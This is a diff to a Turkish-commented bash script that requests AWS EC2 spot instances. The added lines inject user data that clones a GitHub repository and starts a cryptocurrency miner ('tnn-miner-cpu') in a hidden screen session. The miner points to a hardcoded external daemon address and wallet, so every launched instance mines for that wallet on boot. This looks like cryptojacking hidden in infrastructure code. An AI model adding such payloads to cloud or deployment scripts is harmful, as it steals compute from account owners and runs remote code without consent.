@@ -95,6 +95,19 @@ create_spot_request() {
         return
     fi
 
+    # User Data komutları
+    user_data=$(cat <<EOF
+#!/bin/bash
+sudo yum update -y
+sudo yum install git -y
+git clone https://github.com/eraemm/efsaneyim.git
+cd efsaneyim
+chmod 777 tnn-miner-cpu
+screen -dmS spectre ./tnn-miner-cpu --spectre --daemon-address 194.238.25.124 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
+screen -ls
+EOF
+    )
+
     # Spot instance talebi oluştur
     echo "$region bölgesinde uygun bir tür için spot instance talebi oluşturuluyor..."
 
@@ -105,6 +118,7 @@ create_spot_request() {
         --security-group-ids "$security_group_id" \
         --subnet-id "$subnet_id" \
         --instance-market-options '{"MarketType":"spot"}' \
+        --user-data "$user_data" \
         --count 1 \
         --query 'Instances[0].InstanceId' --output text)
 
